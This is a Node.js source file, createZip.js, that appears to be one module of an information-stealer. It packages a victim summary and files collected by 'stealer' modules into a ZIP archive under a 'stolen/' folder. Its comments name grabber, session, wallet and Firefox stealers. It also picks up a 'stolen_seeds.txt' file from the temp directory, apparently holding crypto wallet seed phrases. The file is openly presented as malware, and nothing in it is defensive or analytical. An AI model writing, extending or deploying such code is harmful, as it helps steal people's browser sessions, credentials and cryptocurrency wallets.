
// createZip.js - Final version using process.cwd()
const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const os = require('os');

async function createZip(info, moduleSavedPaths = []) {
    const zipPath = path.join(process.cwd(), 'output.zip');

    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        output.on('close', () => {
            console.log(`[+] ZIP created: ${zipPath} (${(archive.pointer() / 1024).toFixed(2)} KB)`);
            resolve(zipPath);
        });

        archive.on('error', (err) => {
            console.error("[-] Archive error:", err);
            reject(err);
        });

        archive.pipe(output);

        // 1. Add main summary
        if (info) {
            archive.append(JSON.stringify(info, null, 2), { name: 'info.json' });
        } else {
            archive.append("No data available", { name: 'info.txt' });
        }

        // 2. Add all saved files from stealers (grabber, session, wallet, firefox, etc.)
        if (Array.isArray(moduleSavedPaths) && moduleSavedPaths.length > 0) {
            console.log(`[+] Adding ${moduleSavedPaths.length} stolen files to ZIP...`);

            for (const filePath of moduleSavedPaths) {
                if (filePath && fs.existsSync(filePath)) {
                    const fileName = path.basename(filePath);
                    archive.file(filePath, { name: `stolen/${fileName}` });
                }
            }
        }

        // 3. Add extra temporary files
        const tempDir = process.env.TEMP || os.tmpdir();
        const extraFiles = [
            path.join(tempDir, 'stolen_seeds.txt'),
        ];

        for (const file of extraFiles) {
            if (fs.existsSync(file)) {
                archive.file(file, { name: `stolen/${path.basename(file)}` });
            }
        }

        archive.finalize();
    });
}

module.exports = createZip;
